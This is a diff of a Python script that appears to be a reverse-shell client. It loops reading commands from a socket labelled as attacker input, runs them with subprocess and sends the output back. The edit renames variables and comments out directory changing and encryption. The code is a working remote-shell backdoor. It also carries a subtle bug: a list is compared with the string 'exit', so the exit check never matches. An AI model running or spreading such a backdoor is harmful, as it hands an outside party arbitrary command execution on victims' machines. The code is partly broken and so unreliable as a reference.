@@ -19,17 +19,17 @@ print(f'attacker pub key: {attacker_pub_key}')
 
 try:
     while True:
-        data = s.recv(1024)
-        print(f"data.decode(): {data.decode()}")
-        if data.decode() == 'exit':
+        attacker_input = s.recv(1024).decode().split(' ')
+        print(f"attacker_input: {attacker_input}")
+        if attacker_input == 'exit':
             s.close()
             break
-        if data[:2].decode() == 'cd':
-            os.chdir(data[3:].decode())
-        if len(data) > 0:
-            result = subprocess.run(data.decode().split(' '), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
+        # if attacker_input[:2] == 'cd':
+            # os.chdir(data[3:].decode())
+        if len(attacker_input) > 0:
+            result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
             s.send(result.stdout)
-            # encrypted_data = asymmetric_encryption.encrypt_message(data.decode(), pub_key)
+            # encrypted_data = asymmetric_encryption.encrypt_message(attacker_input, pub_key)
             # encrypted_data_b64 = encrypted_data.encode()
             # s.send(encrypted_data_b64)
         else:
